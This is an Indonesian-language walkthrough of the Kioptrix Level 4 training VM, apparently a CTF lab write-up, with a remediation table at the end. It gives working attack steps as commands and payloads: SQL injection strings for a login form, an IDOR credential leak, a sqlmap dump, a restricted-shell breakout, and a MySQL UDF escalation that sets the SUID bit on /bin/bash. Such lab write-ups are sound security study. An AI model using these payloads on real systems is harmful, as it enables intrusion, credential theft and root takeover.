# Walkthrough Kioptrix Level 4 (VM4)

Oct 27, 2026 · Disusun oleh @Yusuf

## Ringkasan Eksekutif

Target **Kioptrix Level 4 (VM4)** berhasil dikuasai sepenuhnya hingga mendapatkan **akses root**. Jalur serangan dimulai dari SQL injection pada form login (`checklogin.php`) yang membuka akses sebagai user `john`, dilanjutkan dengan IDOR pada `member.php` untuk membocorkan password plaintext, SSH login, breakout dari restricted shell (`lshell`), dan diakhiri dengan privilege escalation melalui MySQL User Defined Function (UDF) `sys_exec` karena MySQL berjalan sebagai root tanpa password.

Total terdapat 5 kerentanan signifikan yang dieksploitasi secara berantai (chained exploitation) untuk mencapai root.

## Informasi Target

| Atribut | Nilai |
| --- | --- |
| IP Address | 192.168.56.105 |
| Hostname | Kioptrix4.localdomain / kioptrix3.com (alias di /etc/hosts) |
| OS | Linux (Ubuntu 8.04 Hardy Heron) |
| Web Server | Apache 2.2.8 (Ubuntu), PHP 5.2.4-2ubuntu5.6 dengan Suhosin-Patch |
| Database | MySQL 5.0.51a-3ubuntu5.4 |
| SMB | Samba 3.0.28a (Workgroup: WORKGROUP) |
| SSH | OpenSSH 4.7p1 Debian 8ubuntu1.2 |

**Port terbuka:**

| Port | Service | Keterangan |
| --- | --- | --- |
| 22/tcp | ssh | OpenSSH 4.7p1 |
| 80/tcp | http | Apache 2.2.8 + PHP 5.2.4, form login LigGoat Security Systems |
| 139/tcp | netbios-ssn | Samba 3.X - 4.X |
| 445/tcp | netbios-ssn | Samba 3.0.28a, guest access ke IPC$ (READ/WRITE) |

## Tahap 1 — Reconnaissance

**Host discovery & port scan:**

```
nmap -sn 192.168.56.0/24
nmap -sV -sC -p- 192.168.56.105
```

Hasil menunjukkan 4 port terbuka (22, 80, 139, 445) dengan OS fingerprint Linux dan Samba 3.0.28a. Nama komputer SMB terungkap sebagai **Kioptrix4**, mengonfirmasi identitas target meski sempat disangka Kioptrix Level 3 karena nama file lama (`kioptrix3.com`).

**Directory brute-force:**

```
gobuster dir -u http://192.168.56.105/ -w /usr/share/dirb/wordlists/common.txt -x php,txt,html
```

Menemukan struktur aplikasi web:

- `index.php` — form login "LigGoat Security Systems"
- `checklogin.php` — endpoint proses login (target SQLi)
- `member.php` — halaman member (butuh session valid)
- `/john/john.php` — halaman yang redirect ke login jika belum ada session, jadi clue nama user
- `logout.php`

**Catatan penting:** percobaan menambahkan `kioptrix3.com` ke `/etc/hosts` dengan dugaan virtual hosting ternyata tidak menghasilkan konten berbeda — itu hanya alias, bukan vhost terpisah. Referensi awal ke LotusCMS/Gallarific (ciri khas Kioptrix 3) juga terbukti tidak relevan (404) karena target sebenarnya adalah **Kioptrix Level 4**, bukan Level 3.

## Tahap 2 — SQL Injection pada checklogin.php

**Percobaan awal yang gagal:**

```
myusername=' or 1=1-- -&mypassword=x
myusername=' or 1=1#&mypassword=x
myusername=" or 1=1 -- -&mypassword=x
myusername=' union select 1,2,3,4-- -&mypassword=x
```

Semua payload ini gagal karena ditaruh di field `myusername`, sementara `mypassword` tetap string statis yang tidak valid.

**Payload yang berhasil bypass login (tapi tidak cocok dengan logika aplikasi):**

```bash
curl -s -i -c cookies.txt -d "myusername=admin' or '1'='1&mypassword=admin' or '1'='1" http://192.168.56.105/checklogin.php
```

Ini menghasilkan HTTP 302 redirect ke `login_success.php`, tapi `member.php` menolak dengan pesan "Oups, something went wrong" — karena session menyimpan string injeksi literal (`admin' or '1'='1`), bukan username asli dari database.

**Root cause ditemukan lewat source code `checklogin.php`:**

```php
$myusername = mysql_real_escape_string($myusername); // username di-escape
// $mypassword TIDAK di-escape sama sekali!
$result = mysql_query("SELECT * FROM members WHERE username='$myusername' and password='$mypassword'");
```

Karena hanya `mypassword` yang vulnerable terhadap SQL injection, dan `member.php` memverifikasi username terhadap tabel database yang valid, teknik yang benar adalah:

**1. Taruh username valid (nama user asli), SQLi hanya di password:**

```bash
curl -s -i -c cookies.txt -d "myusername=john&mypassword=' or 1=1 #" http://kioptrix3.com/checklogin.php
```

Query yang terbentuk:

```sql
SELECT * FROM members WHERE username='john' and password='' or 1=1 #'
```

Karena presedensi operator, ini dibaca sebagai `(username='john' AND password='') OR (1=1)` — selalu TRUE. Hasil: **HTTP 302 redirect ke `login_success.php?username=john`** — berhasil login sebagai user yang valid dan dikenal sistem.

**Pelajaran kunci:** username `john` ditemukan dari clue nama folder `/john/` di web root — bukan tebakan acak.

## Tahap 3 — IDOR dan Ekstraksi Kredensial

**IDOR (Insecure Direct Object Reference) pada member.php:**

Setelah login sebagai `john`, parameter GET `username` pada `member.php` bisa dimanipulasi langsung tanpa validasi kepemilikan session:

```bash
curl -s -b cookies.txt "http://kioptrix3.com/member.php?username=john"
```

Response membocorkan **password plaintext** secara langsung di halaman:

| Username | Password |
| --- | --- |
| john | MyNameIsJohn |

**Konfirmasi dan ekstraksi lengkap via sqlmap:**

```bash
sqlmap -u "http://kioptrix3.com/checklogin.php" --data="myusername=john&mypassword=test" -p mypassword --risk=3 --level=3 -D members --dump --batch
```

Parameter `--risk=3 --level=3` diperlukan karena injeksi hanya terdeteksi sebagai **boolean-based blind** dan **time-based blind** pada field `mypassword` — level default sqlmap tidak cukup sensitif untuk mendeteksinya.

Hasil dump tabel `members.members`:

| id | username | password |
| --- | --- | --- |
| 1 | john | MyNameIsJohn |
| 2 | robert | ADGAdsafdfwt4gadfga== (terenkripsi, tidak di-crack) |

Kredensial `john:MyNameIsJohn` siap dipakai untuk akses SSH.

## Tahap 4 — Akses SSH dan Breakout Restricted Shell

**Login SSH** (perlu opsi tambahan karena server menggunakan algoritma host key lama):

```bash
ssh -oHostKeyAlgorithms=+ssh-rsa john@192.168.56.105
# password: MyNameIsJohn
```

**Restricted shell terdeteksi:**

```
Welcome to LigGoat Security Systems - We are Watching
== Welcome LigGoat Employee ==
LigGoat Shell is in place so you don't screw up
Type '?' or 'help' to get the list of allowed commands
```

Command `whoami` dan `id` ditolak sebagai "unknown command". Mengecek daftar command yang diizinkan:

```
john:~$ ?
cd clear echo exit help ll lpath ls
```

Shell ini adalah **lshell** (restricted shell berbasis Python) — hanya whitelist 8 command.

**Breakout berhasil** memanfaatkan command `echo` yang salah di-parse sebagai Python expression:

```
john:~$ echo os.system('/bin/bash')
bash-3.2$ whoami
john
bash-3.2$ id
uid=1001(john) gid=1001(john) groups=1001(john)
```

Shell bash penuh berhasil didapat — restriction lshell berhasil di-bypass sepenuhnya.

## Tahap 5 — Privilege Escalation via MySQL UDF

**Temuan kunci dari source code `checklogin.php`:**

```php
$username="root"; // Mysql username
$password=""; // Mysql password — KOSONG!
```

MySQL root dapat diakses tanpa password, dan proses `mysqld` berjalan sebagai **user root** sistem:

```
root 3914 ... /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql
```

Ini membuka jalur klasik **UDF privilege escalation** (teknik raptor\_udf2).

**Langkah eksploitasi:**

1. Masuk MySQL sebagai root (tanpa password):

```bash
mysql -u root
```

2. Cek lokasi file UDF `sys_exec` yang sudah tersedia di sistem:

```bash
locate lib_mysqludf_sys
# /usr/lib/lib_mysqludf_sys.so
```

3. Cek `datadir` MySQL (lokasi yang diizinkan untuk load shared library UDF di versi 5.0.51a ini):

```sql
SHOW VARIABLES LIKE 'datadir';
-- /var/lib/mysql/
```

4. Salin file `.so` ke `datadir` menggunakan kemampuan MySQL sendiri (bypass permission filesystem user `john` yang tidak punya akses tulis ke `/usr/lib/mysql/`):

```sql
USE mysql;
CREATE TABLE npn(line blob);
INSERT INTO npn VALUES(load_file('/usr/lib/lib_mysqludf_sys.so'));
SELECT * FROM npn INTO DUMPFILE '/var/lib/mysql/lib_mysqludf_sys.so';
```

5. Daftarkan function `sys_exec` (penting: harus `SONAME`, bukan path absolut — MySQL menolak UDF dengan path eksplisit untuk alasan keamanan):

```sql
CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';
```

6. Eksekusi command sebagai root melalui UDF — set SUID bit pada `/bin/bash`:

```sql
SELECT sys_exec('chmod +s /bin/bash');
```

7. Keluar dari MySQL dan jalankan bash dengan privilege preservation:

```bash
exit
/bin/bash -p
whoami
# root
```

**Hasil akhir: ROOT SHELL BERHASIL DIDAPAT.**

## Root Cause dan Rekomendasi Remediasi

| Kerentanan | Root Cause | Rekomendasi |
| --- | --- | --- |
| SQL Injection (checklogin.php) | Field `mypassword` tidak melalui `mysql_real_escape_string()` atau prepared statement | Gunakan prepared statements/parameterized queries (PDO atau mysqli), validasi dan escape SEMUA input user tanpa kecuali |
| IDOR (member.php) | Parameter `username` di URL dipakai langsung tanpa verifikasi bahwa itu milik session yang login | Validasi otorisasi di server-side: selalu bandingkan resource yang diminta dengan identitas session aktif, jangan percaya parameter dari client |
| Password plaintext di database | Password disimpan tanpa hashing (`MyNameIsJohn` tersimpan apa adanya) | Gunakan hashing kuat (bcrypt/Argon2) dengan salt, jangan pernah simpan password plaintext |
| Restricted shell (lshell) bypass | Whitelist command tidak memfilter argumen yang dievaluasi sebagai ekspresi Python (`echo os.system(...)`) | Gunakan sandboxing yang tervalidasi ketat, hindari command whitelisting yang masih mengizinkan evaluasi kode arbitrer |
| MySQL UDF Privilege Escalation | MySQL root tanpa password & mysqld berjalan sebagai root; UDF `sys_exec` tersedia di sistem | Set password kuat untuk MySQL root, jalankan mysqld sebagai user non-privileged (mysql user), hapus UDF berbahaya seperti `lib_mysqludf_sys.so` dari produksi, batasi `FILE` privilege |
| SMB Guest Access | Anonymous/guest access READ/WRITE ke share IPC$ | Nonaktifkan guest access pada Samba, terapkan `restrict anonymous` dan autentikasi wajib |
| Software usang | Apache 2.2.8, PHP 5.2.4, MySQL 5.0.51a, Samba 3.0.28a — semua EOL dengan banyak CVE diketahui | Upgrade ke versi yang didukung dan terapkan patch management rutin |

## Lampiran

### Kredensial yang Ditemukan

| User | Password/Hash | Sumber |
| --- | --- | --- |
| john | MyNameIsJohn (plaintext) | IDOR member.php?username=john + konfirmasi sqlmap dump |
| robert | ADGAdsafdfwt4gadfga== (belum di-crack) | sqlmap dump tabel members |
| mysql root | (tanpa password) | Source code checklogin.php |

### Ringkasan Jalur Serangan (Attack Chain)

1. Reconnaissance: nmap + gobuster → identifikasi form login dan folder `/john/`
2. SQL Injection pada `mypassword` dengan username valid `john` → bypass login
3. IDOR pada `member.php?username=john` → bocor password plaintext
4. Konfirmasi via sqlmap dump tabel `members` (risk=3, level=3)
5. SSH login sebagai `john` dengan kredensial yang ditemukan
6. Breakout dari restricted shell `lshell` via `echo os.system('/bin/bash')`
7. Privilege escalation via MySQL UDF `sys_exec` (raptor\_udf2 technique)
8. Root shell diperoleh via `chmod +s /bin/bash` + `/bin/bash -p`

### Referensi

Teknik privilege escalation pada CTF ini konsisten dengan dokumentasi publik Kioptrix Level 4 di [aldeid.com](https://aldeid.com/wiki/Kioptrix4) dan walkthrough komunitas lainnya, yang mengonfirmasi pola SQLi + MySQL UDF sebagai jalur penyelesaian standar untuk mesin ini.
